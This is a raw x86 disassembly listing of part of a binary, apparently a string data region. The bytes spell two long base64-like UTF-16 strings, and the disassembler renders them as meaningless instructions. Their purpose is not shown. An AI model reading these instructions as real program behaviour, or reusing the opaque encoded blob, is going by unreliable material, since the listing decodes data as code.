  40b4a6:	75 00                	jne    0x40b4a8
  40b4a8:	6c                   	insb   (%dx),%es:(%edi)
  40b4a9:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  40b4ad:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b4b0:	50                   	push   %eax
  40b4b1:	00 4e 00             	add    %cl,0x0(%esi)
  40b4b4:	57                   	push   %edi
  40b4b5:	00 45 00             	add    %al,0x0(%ebp)
  40b4b8:	6a 00                	push   $0x0
  40b4ba:	42                   	inc    %edx
  40b4bb:	00 6f 00             	add    %ch,0x0(%edi)
  40b4be:	77 00                	ja     0x40b4c0
  40b4c0:	63 00                	arpl   %eax,(%eax)
  40b4c2:	77 00                	ja     0x40b4c4
  40b4c4:	53                   	push   %ebx
  40b4c5:	00 50 00             	add    %dl,0x0(%eax)
  40b4c8:	7a 00                	jp     0x40b4ca
  40b4ca:	69 00 72 00 41 00    	imul   $0x410072,(%eax),%eax
  40b4d0:	6d                   	insl   (%dx),%es:(%edi)
  40b4d1:	00 49 00             	add    %cl,0x0(%ecx)
  40b4d4:	57                   	push   %edi
  40b4d5:	00 6e 00             	add    %ch,0x0(%esi)
  40b4d8:	76 00                	jbe    0x40b4da
  40b4da:	59                   	pop    %ecx
  40b4db:	00 55 00             	add    %dl,0x0(%ebp)
  40b4de:	63 00                	arpl   %eax,(%eax)
  40b4e0:	30 00                	xor    %al,(%eax)
  40b4e2:	4d                   	dec    %ebp
  40b4e3:	00 53 00             	add    %dl,0x0(%ebx)
  40b4e6:	5a                   	pop    %edx
  40b4e7:	00 6d 00             	add    %ch,0x0(%ebp)
  40b4ea:	39 00                	cmp    %eax,(%eax)
  40b4ec:	30 00                	xor    %al,(%eax)
  40b4ee:	4c                   	dec    %esp
  40b4ef:	00 49 00             	add    %cl,0x0(%ecx)
  40b4f2:	78 00                	js     0x40b4f4
  40b4f4:	53                   	push   %ebx
  40b4f5:	00 6d 00             	add    %ch,0x0(%ebp)
  40b4f8:	6d                   	insl   (%dx),%es:(%edi)
  40b4f9:	00 6d 00             	add    %ch,0x0(%ebp)
  40b4fc:	54                   	push   %esp
  40b4fd:	00 61 00             	add    %ah,0x0(%ecx)
  40b500:	6f                   	outsl  %ds:(%esi),(%dx)
  40b501:	00 48 00             	add    %cl,0x0(%eax)
  40b504:	6f                   	outsl  %ds:(%esi),(%dx)
  40b505:	00 37                	add    %dh,(%edi)
  40b507:	00 2b                	add    %ch,(%ebx)
  40b509:	00 76 00             	add    %dh,0x0(%esi)
  40b50c:	4f                   	dec    %edi
  40b50d:	00 70 00             	add    %dh,0x0(%eax)
  40b510:	62 00                	bound  %eax,(%eax)
  40b512:	75 00                	jne    0x40b514
  40b514:	38 00                	cmp    %al,(%eax)
  40b516:	79 00                	jns    0x40b518
  40b518:	38 00                	cmp    %al,(%eax)
  40b51a:	47                   	inc    %edi
  40b51b:	00 48 00             	add    %cl,0x0(%eax)
  40b51e:	76 00                	jbe    0x40b520
  40b520:	61                   	popa
  40b521:	00 6f 00             	add    %ch,0x0(%edi)
  40b524:	48                   	dec    %eax
  40b525:	00 32                	add    %dh,(%edx)
  40b527:	00 37                	add    %dh,(%edi)
  40b529:	00 77 00             	add    %dh,0x0(%edi)
  40b52c:	42                   	inc    %edx
  40b52d:	00 72 00             	add    %dh,0x0(%edx)
  40b530:	63 00                	arpl   %eax,(%eax)
  40b532:	62 00                	bound  %eax,(%eax)
  40b534:	6c                   	insb   (%dx),%es:(%edi)
  40b535:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40b539:	00 36                	add    %dh,(%esi)
  40b53b:	00 38                	add    %bh,(%eax)
  40b53d:	00 53 00             	add    %dl,0x0(%ebx)
  40b540:	4c                   	dec    %esp
  40b541:	00 76 00             	add    %dh,0x0(%esi)
  40b544:	50                   	push   %eax
  40b545:	00 4a 00             	add    %cl,0x0(%edx)
  40b548:	53                   	push   %ebx
  40b549:	00 61 00             	add    %ah,0x0(%ecx)
  40b54c:	58                   	pop    %eax
  40b54d:	00 6a 00             	add    %ch,0x0(%edx)
  40b550:	61                   	popa
  40b551:	00 47 00             	add    %al,0x0(%edi)
  40b554:	64 00 6c 00 35       	add    %ch,%fs:0x35(%eax,%eax,1)
  40b559:	00 42 00             	add    %al,0x0(%edx)
  40b55c:	4b                   	dec    %ebx
  40b55d:	00 77 00             	add    %dh,0x0(%edi)
  40b560:	2f                   	das
  40b561:	00 70 00             	add    %dh,0x0(%eax)
  40b564:	4e                   	dec    %esi
  40b565:	00 4a 00             	add    %cl,0x0(%edx)
  40b568:	4c                   	dec    %esp
  40b569:	00 38                	add    %bh,(%eax)
  40b56b:	00 62 00             	add    %ah,0x0(%edx)
  40b56e:	74 00                	je     0x40b570
  40b570:	59                   	pop    %ecx
  40b571:	00 35 00 79 00 33    	add    %dh,0x33007900
  40b577:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b57a:	69 00 6a 00 55 00    	imul   $0x55006a,(%eax),%eax
  40b580:	33 00                	xor    (%eax),%eax
  40b582:	4e                   	dec    %esi
  40b583:	00 72 00             	add    %dh,0x0(%edx)
  40b586:	39 00                	cmp    %eax,(%eax)
  40b588:	78 00                	js     0x40b58a
  40b58a:	69 00 32 00 56 00    	imul   $0x560032,(%eax),%eax
  40b590:	4a                   	dec    %edx
  40b591:	00 46 00             	add    %al,0x0(%esi)
  40b594:	47                   	inc    %edi
  40b595:	00 72 00             	add    %dh,0x0(%edx)
  40b598:	5a                   	pop    %edx
  40b599:	00 4e 00             	add    %cl,0x0(%esi)
  40b59c:	58                   	pop    %eax
  40b59d:	00 78 00             	add    %bh,0x0(%eax)
  40b5a0:	53                   	push   %ebx
  40b5a1:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b5a5:	00 73 00             	add    %dh,0x0(%ebx)
  40b5a8:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40b5ac:	44                   	inc    %esp
  40b5ad:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5b0:	42                   	inc    %edx
  40b5b1:	00 6a 00             	add    %ch,0x0(%edx)
  40b5b4:	61                   	popa
  40b5b5:	00 38                	add    %bh,(%eax)
  40b5b7:	00 57 00             	add    %dl,0x0(%edi)
  40b5ba:	30 00                	xor    %al,(%eax)
  40b5bc:	55                   	push   %ebp
  40b5bd:	00 6e 00             	add    %ch,0x0(%esi)
  40b5c0:	47                   	inc    %edi
  40b5c1:	00 49 00             	add    %cl,0x0(%ecx)
  40b5c4:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5c5:	00 41 00             	add    %al,0x0(%ecx)
  40b5c8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5c9:	00 72 00             	add    %dh,0x0(%edx)
  40b5cc:	46                   	inc    %esi
  40b5cd:	00 2f                	add    %ch,(%edi)
  40b5cf:	00 58 00             	add    %bl,0x0(%eax)
  40b5d2:	6d                   	insl   (%dx),%es:(%edi)
  40b5d3:	00 52 00             	add    %dl,0x0(%edx)
  40b5d6:	37                   	aaa
  40b5d7:	00 50 00             	add    %dl,0x0(%eax)
  40b5da:	55                   	push   %ebp
  40b5db:	00 4f 00             	add    %cl,0x0(%edi)
  40b5de:	42                   	inc    %edx
  40b5df:	00 52 00             	add    %dl,0x0(%edx)
  40b5e2:	71 00                	jno    0x40b5e4
  40b5e4:	64 00 44 00 6e       	add    %al,%fs:0x6e(%eax,%eax,1)
  40b5e9:	00 55 00             	add    %dl,0x0(%ebp)
  40b5ec:	4a                   	dec    %edx
  40b5ed:	00 39                	add    %bh,(%ecx)
  40b5ef:	00 73 00             	add    %dh,0x0(%ebx)
  40b5f2:	52                   	push   %edx
  40b5f3:	00 4d 00             	add    %cl,0x0(%ebp)
  40b5f6:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40b5fa:	6b 00 45             	imul   $0x45,(%eax),%eax
  40b5fd:	00 76 00             	add    %dh,0x0(%esi)
  40b600:	62 00                	bound  %eax,(%eax)
  40b602:	46                   	inc    %esi
  40b603:	00 67 00             	add    %ah,0x0(%edi)
  40b606:	6d                   	insl   (%dx),%es:(%edi)
  40b607:	00 32                	add    %dh,(%edx)
  40b609:	00 52 00             	add    %dl,0x0(%edx)
  40b60c:	46                   	inc    %esi
  40b60d:	00 4f 00             	add    %cl,0x0(%edi)
  40b610:	62 00                	bound  %eax,(%eax)
  40b612:	58                   	pop    %eax
  40b613:	00 2f                	add    %ch,(%edi)
  40b615:	00 50 00             	add    %dl,0x0(%eax)
  40b618:	39 00                	cmp    %eax,(%eax)
  40b61a:	71 00                	jno    0x40b61c
  40b61c:	55                   	push   %ebp
  40b61d:	00 76 00             	add    %dh,0x0(%esi)
  40b620:	39 00                	cmp    %eax,(%eax)
  40b622:	53                   	push   %ebx
  40b623:	00 46 00             	add    %al,0x0(%esi)
  40b626:	33 00                	xor    (%eax),%eax
  40b628:	4d                   	dec    %ebp
  40b629:	00 32                	add    %dh,(%edx)
  40b62b:	00 31                	add    %dh,(%ecx)
  40b62d:	00 36                	add    %dh,(%esi)
  40b62f:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  40b633:	00 69 00             	add    %ch,0x0(%ecx)
  40b636:	44                   	inc    %esp
  40b637:	00 50 00             	add    %dl,0x0(%eax)
  40b63a:	74 00                	je     0x40b63c
  40b63c:	4f                   	dec    %edi
  40b63d:	00 56 00             	add    %dl,0x0(%esi)
  40b640:	57                   	push   %edi
  40b641:	00 72 00             	add    %dh,0x0(%edx)
  40b644:	38 00                	cmp    %al,(%eax)
  40b646:	4e                   	dec    %esi
  40b647:	00 67 00             	add    %ah,0x0(%edi)
  40b64a:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b64e:	71 00                	jno    0x40b650
  40b650:	76 00                	jbe    0x40b652
  40b652:	62 00                	bound  %eax,(%eax)
  40b654:	62 00                	bound  %eax,(%eax)
  40b656:	42                   	inc    %edx
  40b657:	00 50 00             	add    %dl,0x0(%eax)
  40b65a:	61                   	popa
  40b65b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b65e:	35 00 4d 00 59       	xor    $0x59004d00,%eax
  40b663:	00 42 00             	add    %al,0x0(%edx)
  40b666:	4b                   	dec    %ebx
  40b667:	00 31                	add    %dh,(%ecx)
  40b669:	00 31                	add    %dh,(%ecx)
  40b66b:	00 6b 00             	add    %ch,0x0(%ebx)
  40b66e:	58                   	pop    %eax
  40b66f:	00 6a 00             	add    %ch,0x0(%edx)
  40b672:	51                   	push   %ecx
  40b673:	00 42 00             	add    %al,0x0(%edx)
  40b676:	39 00                	cmp    %eax,(%eax)
  40b678:	69 00 58 00 42 00    	imul   $0x420058,(%eax),%eax
  40b67e:	43                   	inc    %ebx
  40b67f:	00 66 00             	add    %ah,0x0(%esi)
  40b682:	6e                   	outsb  %ds:(%esi),(%dx)
  40b683:	00 35 00 46 00 77    	add    %dh,0x77004600
  40b689:	00 56 00             	add    %dl,0x0(%esi)
  40b68c:	61                   	popa
  40b68d:	00 53 00             	add    %dl,0x0(%ebx)
  40b690:	4f                   	dec    %edi
  40b691:	00 2b                	add    %ch,(%ebx)
  40b693:	00 6b 00             	add    %ch,0x0(%ebx)
  40b696:	75 00                	jne    0x40b698
  40b698:	6b 00 37             	imul   $0x37,(%eax),%eax
  40b69b:	00 7a 00             	add    %bh,0x0(%edx)
  40b69e:	2f                   	das
  40b69f:	00 70 00             	add    %dh,0x0(%eax)
  40b6a2:	49                   	dec    %ecx
  40b6a3:	00 50 00             	add    %dl,0x0(%eax)
  40b6a6:	34 00                	xor    $0x0,%al
  40b6a8:	49                   	dec    %ecx
  40b6a9:	00 32                	add    %dh,(%edx)
  40b6ab:	00 72 00             	add    %dh,0x0(%edx)
  40b6ae:	71 00                	jno    0x40b6b0
  40b6b0:	51                   	push   %ecx
  40b6b1:	00 70 00             	add    %dh,0x0(%eax)
  40b6b4:	53                   	push   %ebx
  40b6b5:	00 72 00             	add    %dh,0x0(%edx)
  40b6b8:	4e                   	dec    %esi
  40b6b9:	00 59 00             	add    %bl,0x0(%ecx)
  40b6bc:	5a                   	pop    %edx
  40b6bd:	00 67 00             	add    %ah,0x0(%edi)
  40b6c0:	54                   	push   %esp
  40b6c1:	00 55 00             	add    %dl,0x0(%ebp)
  40b6c4:	6c                   	insb   (%dx),%es:(%edi)
  40b6c5:	00 70 00             	add    %dh,0x0(%eax)
  40b6c8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6c9:	00 4a 00             	add    %cl,0x0(%edx)
  40b6cc:	4f                   	dec    %edi
  40b6cd:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  40b6d1:	00 35 00 36 00 73    	add    %dh,0x73003600
  40b6d7:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40b6db:	00 38                	add    %bh,(%eax)
  40b6dd:	00 4e 00             	add    %cl,0x0(%esi)
  40b6e0:	78 00                	js     0x40b6e2
  40b6e2:	50                   	push   %eax
  40b6e3:	00 7a 00             	add    %bh,0x0(%edx)
  40b6e6:	70 00                	jo     0x40b6e8
  40b6e8:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b6ec:	54                   	push   %esp
  40b6ed:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  40b6f1:	00 65 00             	add    %ah,0x0(%ebp)
  40b6f4:	38 00                	cmp    %al,(%eax)
  40b6f6:	53                   	push   %ebx
  40b6f7:	00 49 00             	add    %cl,0x0(%ecx)
  40b6fa:	6a 00                	push   $0x0
  40b6fc:	47                   	inc    %edi
  40b6fd:	00 4f 00             	add    %cl,0x0(%edi)
  40b700:	6b 00 35             	imul   $0x35,(%eax),%eax
  40b703:	00 56 00             	add    %dl,0x0(%esi)
  40b706:	5a                   	pop    %edx
  40b707:	00 51 00             	add    %dl,0x0(%ecx)
  40b70a:	4e                   	dec    %esi
  40b70b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b70e:	63 00                	arpl   %eax,(%eax)
  40b710:	44                   	inc    %esp
  40b711:	00 42 00             	add    %al,0x0(%edx)
  40b714:	6a 00                	push   $0x0
  40b716:	7a 00                	jp     0x40b718
  40b718:	57                   	push   %edi
  40b719:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40b71d:	00 50 00             	add    %dl,0x0(%eax)
  40b720:	55                   	push   %ebp
  40b721:	00 3d 00 00 87 b1    	add    %bh,0xb1870000
  40b727:	33 00                	xor    (%eax),%eax
  40b729:	71 00                	jno    0x40b72b
  40b72b:	57                   	push   %edi
  40b72c:	00 63 00             	add    %ah,0x0(%ebx)
  40b72f:	78 00                	js     0x40b731
  40b731:	6e                   	outsb  %ds:(%esi),(%dx)
  40b732:	00 33                	add    %dh,(%ebx)
  40b734:	00 57 00             	add    %dl,0x0(%edi)
  40b737:	4a                   	dec    %edx
  40b738:	00 4e 00             	add    %cl,0x0(%esi)
  40b73b:	62 00                	bound  %eax,(%eax)
  40b73d:	31 00                	xor    %eax,(%eax)
  40b73f:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b743:	56                   	push   %esi
  40b744:	00 32                	add    %dh,(%edx)
  40b746:	00 30                	add    %dh,(%eax)
  40b748:	00 66 00             	add    %ah,0x0(%esi)
  40b74b:	52                   	push   %edx
  40b74c:	00 77 00             	add    %dh,0x0(%edi)
  40b74f:	73 00                	jae    0x40b751
  40b751:	7a 00                	jp     0x40b753
  40b753:	55                   	push   %ebp
  40b754:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40b758:	00 6d 00             	add    %ch,0x0(%ebp)
  40b75b:	79 00                	jns    0x40b75d
  40b75d:	52                   	push   %edx
  40b75e:	00 50 00             	add    %dl,0x0(%eax)
  40b761:	36 00 4c 00 70       	add    %cl,%ss:0x70(%eax,%eax,1)
  40b766:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
  40b76a:	00 62 00             	add    %ah,0x0(%edx)
  40b76d:	7a 00                	jp     0x40b76f
  40b76f:	4e                   	dec    %esi
  40b770:	00 65 00             	add    %ah,0x0(%ebp)
  40b773:	71 00                	jno    0x40b775
  40b775:	41                   	inc    %ecx
  40b776:	00 59 00             	add    %bl,0x0(%ecx)
  40b779:	75 00                	jne    0x40b77b
  40b77b:	37                   	aaa
  40b77c:	00 48 00             	add    %cl,0x0(%eax)
  40b77f:	51                   	push   %ecx
  40b780:	00 54 00 70          	add    %dl,0x70(%eax,%eax,1)
  40b784:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  40b788:	00 6a 00             	add    %ch,0x0(%edx)
  40b78b:	46                   	inc    %esi
  40b78c:	00 4a 00             	add    %cl,0x0(%edx)
  40b78f:	30 00                	xor    %al,(%eax)
  40b791:	74 00                	je     0x40b793
  40b793:	78 00                	js     0x40b795
  40b795:	6a 00                	push   $0x0
  40b797:	7a 00                	jp     0x40b799
  40b799:	56                   	push   %esi
  40b79a:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  40b79e:	00 36                	add    %dh,(%esi)
  40b7a0:	00 4a 00             	add    %cl,0x0(%edx)
  40b7a3:	62 00                	bound  %eax,(%eax)
  40b7a5:	55                   	push   %ebp
  40b7a6:	00 48 00             	add    %cl,0x0(%eax)
  40b7a9:	58                   	pop    %eax
  40b7aa:	00 78 00             	add    %bh,0x0(%eax)
  40b7ad:	74 00                	je     0x40b7af
  40b7af:	47                   	inc    %edi
  40b7b0:	00 4f 00             	add    %cl,0x0(%edi)
  40b7b3:	49                   	dec    %ecx
  40b7b4:	00 70 00             	add    %dh,0x0(%eax)
  40b7b7:	47                   	inc    %edi
  40b7b8:	00 53 00             	add    %dl,0x0(%ebx)
  40b7bb:	51                   	push   %ecx
  40b7bc:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  40b7c0:	00 48 00             	add    %cl,0x0(%eax)
  40b7c3:	49                   	dec    %ecx
  40b7c4:	00 41 00             	add    %al,0x0(%ecx)
  40b7c7:	4f                   	dec    %edi
  40b7c8:	00 46 00             	add    %al,0x0(%esi)
  40b7cb:	32 00                	xor    (%eax),%al
  40b7cd:	68 00 56 00 7a       	push   $0x7a005600
  40b7d2:	00 37                	add    %dh,(%edi)
  40b7d4:	00 57 00             	add    %dl,0x0(%edi)
  40b7d7:	64 00 30             	add    %dh,%fs:(%eax)
  40b7da:	00 6f 00             	add    %ch,0x0(%edi)
  40b7dd:	42                   	inc    %edx
  40b7de:	00 31                	add    %dh,(%ecx)
  40b7e0:	00 69 00             	add    %ch,0x0(%ecx)
  40b7e3:	48                   	dec    %eax
  40b7e4:	00 31                	add    %dh,(%ecx)
  40b7e6:	00 4b 00             	add    %cl,0x0(%ebx)
  40b7e9:	2b 00                	sub    (%eax),%eax
  40b7eb:	44                   	inc    %esp
  40b7ec:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40b7f0:	00 70 00             	add    %dh,0x0(%eax)
  40b7f3:	68 00 74 00 63       	push   $0x63007400
  40b7f8:	00 6d 00             	add    %ch,0x0(%ebp)
  40b7fb:	32 00                	xor    (%eax),%al
  40b7fd:	78 00                	js     0x40b7ff
  40b7ff:	77 00                	ja     0x40b801
  40b801:	53                   	push   %ebx
  40b802:	00 42 00             	add    %al,0x0(%edx)
  40b805:	59                   	pop    %ecx
  40b806:	00 7a 00             	add    %bh,0x0(%edx)
  40b809:	30 00                	xor    %al,(%eax)
  40b80b:	53                   	push   %ebx
  40b80c:	00 6e 00             	add    %ch,0x0(%esi)
  40b80f:	48                   	dec    %eax
  40b810:	00 6f 00             	add    %ch,0x0(%edi)
  40b813:	6d                   	insl   (%dx),%es:(%edi)
  40b814:	00 4f 00             	add    %cl,0x0(%edi)
  40b817:	44                   	inc    %esp
  40b818:	00 71 00             	add    %dh,0x0(%ecx)
  40b81b:	71 00                	jno    0x40b81d
  40b81d:	58                   	pop    %eax
  40b81e:	00 47 00             	add    %al,0x0(%edi)
  40b821:	2f                   	das
  40b822:	00 35 00 51 00 46    	add    %dh,0x46005100
  40b828:	00 67 00             	add    %ah,0x0(%edi)
  40b82b:	38 00                	cmp    %al,(%eax)
  40b82d:	35 00 6e 00 79       	xor    $0x79006e00,%eax
  40b832:	00 31                	add    %dh,(%ecx)
  40b834:	00 30                	add    %dh,(%eax)
  40b836:	00 63 00             	add    %ah,0x0(%ebx)
  40b839:	43                   	inc    %ebx
  40b83a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b83d:	50                   	push   %eax
  40b83e:	00 32                	add    %dh,(%edx)
  40b840:	00 43 00             	add    %al,0x0(%ebx)
  40b843:	47                   	inc    %edi
  40b844:	00 43 00             	add    %al,0x0(%ebx)
  40b847:	2b 00                	sub    (%eax),%eax
  40b849:	41                   	inc    %ecx
  40b84a:	00 72 00             	add    %dh,0x0(%edx)
  40b84d:	39 00                	cmp    %eax,(%eax)
  40b84f:	69 00 4e 00 58 00    	imul   $0x58004e,(%eax),%eax
  40b855:	52                   	push   %edx
  40b856:	00 55 00             	add    %dl,0x0(%ebp)
  40b859:	47                   	inc    %edi
  40b85a:	00 4e 00             	add    %cl,0x0(%esi)
  40b85d:	74 00                	je     0x40b85f
  40b85f:	4e                   	dec    %esi
  40b860:	00 30                	add    %dh,(%eax)
  40b862:	00 55 00             	add    %dl,0x0(%ebp)
  40b865:	51                   	push   %ecx
  40b866:	00 42 00             	add    %al,0x0(%edx)
  40b869:	56                   	push   %esi
  40b86a:	00 56 00             	add    %dl,0x0(%esi)
  40b86d:	54                   	push   %esp
  40b86e:	00 53 00             	add    %dl,0x0(%ebx)
  40b871:	4c                   	dec    %esp
  40b872:	00 4b 00             	add    %cl,0x0(%ebx)
  40b875:	6c                   	insb   (%dx),%es:(%edi)
  40b876:	00 53 00             	add    %dl,0x0(%ebx)
  40b879:	56                   	push   %esi
  40b87a:	00 50 00             	add    %dl,0x0(%eax)
  40b87d:	32 00                	xor    (%eax),%al
  40b87f:	49                   	dec    %ecx
  40b880:	00 61 00             	add    %ah,0x0(%ecx)
  40b883:	51                   	push   %ecx
  40b884:	00 35 00 6b 00 53    	add    %dh,0x53006b00
  40b88a:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  40b88e:	00 72 00             	add    %dh,0x0(%edx)
  40b891:	5a                   	pop    %edx
  40b892:	00 49 00             	add    %cl,0x0(%ecx)
  40b895:	66 00 6c 00 75       	data16 add %ch,0x75(%eax,%eax,1)
  40b89a:	00 68 00             	add    %ch,0x0(%eax)
  40b89d:	48                   	dec    %eax
  40b89e:	00 61 00             	add    %ah,0x0(%ecx)
  40b8a1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8a2:	00 61 00             	add    %ah,0x0(%ecx)
  40b8a5:	37                   	aaa
  40b8a6:	00 4a 00             	add    %cl,0x0(%edx)
  40b8a9:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40b8ac:	00 65 00             	add    %ah,0x0(%ebp)
  40b8af:	31 00                	xor    %eax,(%eax)
  40b8b1:	73 00                	jae    0x40b8b3
  40b8b3:	2f                   	das
  40b8b4:	00 37                	add    %dh,(%edi)
  40b8b6:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40b8ba:	00 75 00             	add    %dh,0x0(%ebp)
  40b8bd:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40b8c1:	35 00 68 00 6e       	xor    $0x6e006800,%eax
  40b8c6:	00 42 00             	add    %al,0x0(%edx)
  40b8c9:	4e                   	dec    %esi
  40b8ca:	00 45 00             	add    %al,0x0(%ebp)
  40b8cd:	78 00                	js     0x40b8cf
  40b8cf:	73 00                	jae    0x40b8d1
  40b8d1:	4c                   	dec    %esp
  40b8d2:	00 6a 00             	add    %ch,0x0(%edx)
  40b8d5:	42                   	inc    %edx
  40b8d6:	00 53 00             	add    %dl,0x0(%ebx)
  40b8d9:	61                   	popa
  40b8da:	00 56 00             	add    %dl,0x0(%esi)
  40b8dd:	54                   	push   %esp
  40b8de:	00 79 00             	add    %bh,0x0(%ecx)
  40b8e1:	32 00                	xor    (%eax),%al
  40b8e3:	4a                   	dec    %edx
  40b8e4:	00 49 00             	add    %cl,0x0(%ecx)
  40b8e7:	46                   	inc    %esi
  40b8e8:	00 49 00             	add    %cl,0x0(%ecx)
  40b8eb:	45                   	inc    %ebp
  40b8ec:	00 53 00             	add    %dl,0x0(%ebx)
  40b8ef:	57                   	push   %edi
  40b8f0:	00 78 00             	add    %bh,0x0(%eax)
  40b8f3:	77 00                	ja     0x40b8f5
  40b8f5:	34 00                	xor    $0x0,%al
  40b8f7:	63 00                	arpl   %eax,(%eax)
  40b8f9:	78 00                	js     0x40b8fb
  40b8fb:	79 00                	jns    0x40b8fd
  40b8fd:	44                   	inc    %esp
  40b8fe:	00 69 00             	add    %ch,0x0(%ecx)
  40b901:	47                   	inc    %edi
  40b902:	00 61 00             	add    %ah,0x0(%ecx)
  40b905:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40b909:	42                   	inc    %edx
  40b90a:	00 78 00             	add    %bh,0x0(%eax)
  40b90d:	58                   	pop    %eax
  40b90e:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40b912:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40b916:	00 55 00             	add    %dl,0x0(%ebp)
  40b919:	57                   	push   %edi
  40b91a:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  40b91e:	00 79 00             	add    %bh,0x0(%ecx)
  40b921:	50                   	push   %eax
  40b922:	00 5a 00             	add    %bl,0x0(%edx)
  40b925:	68 00 74 00 5a       	push   $0x5a007400
  40b92a:	00 50 00             	add    %dl,0x0(%eax)
  40b92d:	53                   	push   %ebx
  40b92e:	00 51 00             	add    %dl,0x0(%ecx)
  40b931:	6e                   	outsb  %ds:(%esi),(%dx)
  40b932:	00 71 00             	add    %dh,0x0(%ecx)
  40b935:	69 00 4a 00 34 00    	imul   $0x34004a,(%eax),%eax
  40b93b:	4b                   	dec    %ebx
  40b93c:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40b940:	00 39                	add    %bh,(%ecx)
  40b942:	00 6b 00             	add    %ch,0x0(%ebx)
  40b945:	6c                   	insb   (%dx),%es:(%edi)
  40b946:	00 69 00             	add    %ch,0x0(%ecx)
  40b949:	63 00                	arpl   %eax,(%eax)
  40b94b:	73 00                	jae    0x40b94d
  40b94d:	6a 00                	push   $0x0
  40b94f:	6a 00                	push   $0x0
  40b951:	69 00 64 00 69 00    	imul   $0x690064,(%eax),%eax
  40b957:	52                   	push   %edx
  40b958:	00 41 00             	add    %al,0x0(%ecx)
  40b95b:	30 00                	xor    %al,(%eax)
  40b95d:	51                   	push   %ecx
  40b95e:	00 75 00             	add    %dh,0x0(%ebp)
  40b961:	6e                   	outsb  %ds:(%esi),(%dx)
  40b962:	00 47 00             	add    %al,0x0(%edi)
  40b965:	6a 00                	push   $0x0
  40b967:	71 00                	jno    0x40b969
  40b969:	34 00                	xor    $0x0,%al
  40b96b:	58                   	pop    %eax
  40b96c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b96f:	38 00                	cmp    %al,(%eax)
  40b971:	54                   	push   %esp
  40b972:	00 30                	add    %dh,(%eax)
  40b974:	00 4e 00             	add    %cl,0x0(%esi)
  40b977:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40b97b:	75 00                	jne    0x40b97d
  40b97d:	50                   	push   %eax
  40b97e:	00 70 00             	add    %dh,0x0(%eax)
  40b981:	4d                   	dec    %ebp
  40b982:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
  40b986:	00 2b                	add    %ch,(%ebx)
  40b988:	00 68 00             	add    %ch,0x0(%eax)
  40b98b:	53                   	push   %ebx
  40b98c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b98f:	5a                   	pop    %edx
  40b990:	00 70 00             	add    %dh,0x0(%eax)
  40b993:	59                   	pop    %ecx
  40b994:	00 41 00             	add    %al,0x0(%ecx)
  40b997:	4e                   	dec    %esi
  40b998:	00 50 00             	add    %dl,0x0(%eax)
  40b99b:	55                   	push   %ebp
  40b99c:	00 59 00             	add    %bl,0x0(%ecx)
  40b99f:	6b 00 35             	imul   $0x35,(%eax),%eax
  40b9a2:	00 4a 00             	add    %cl,0x0(%edx)
  40b9a5:	32 00                	xor    (%eax),%al
  40b9a7:	75 00                	jne    0x40b9a9
  40b9a9:	77 00                	ja     0x40b9ab
  40b9ab:	54                   	push   %esp
  40b9ac:	00 48 00             	add    %cl,0x0(%eax)
  40b9af:	41                   	inc    %ecx
  40b9b0:	00 2f                	add    %ch,(%edi)
  40b9b2:	00 77 00             	add    %dh,0x0(%edi)
  40b9b5:	4d                   	dec    %ebp
  40b9b6:	00 56 00             	add    %dl,0x0(%esi)
  40b9b9:	68 00 46 00 4f       	push   $0x4f004600
  40b9be:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  40b9c2:	00 43 00             	add    %al,0x0(%ebx)
  40b9c5:	34 00                	xor    $0x0,%al
  40b9c7:	77 00                	ja     0x40b9c9
  40b9c9:	51                   	push   %ecx
  40b9ca:	00 31                	add    %dh,(%ecx)
  40b9cc:	00 61 00             	add    %ah,0x0(%ecx)
  40b9cf:	78 00                	js     0x40b9d1
  40b9d1:	4b                   	dec    %ebx
  40b9d2:	00 69 00             	add    %ch,0x0(%ecx)
  40b9d5:	2b 00                	sub    (%eax),%eax
  40b9d7:	44                   	inc    %esp
  40b9d8:	00 59 00             	add    %bl,0x0(%ecx)
  40b9db:	68 00 42 00 4a       	push   $0x4a004200
  40b9e0:	00 57 00             	add    %dl,0x0(%edi)
  40b9e3:	49                   	dec    %ecx
  40b9e4:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
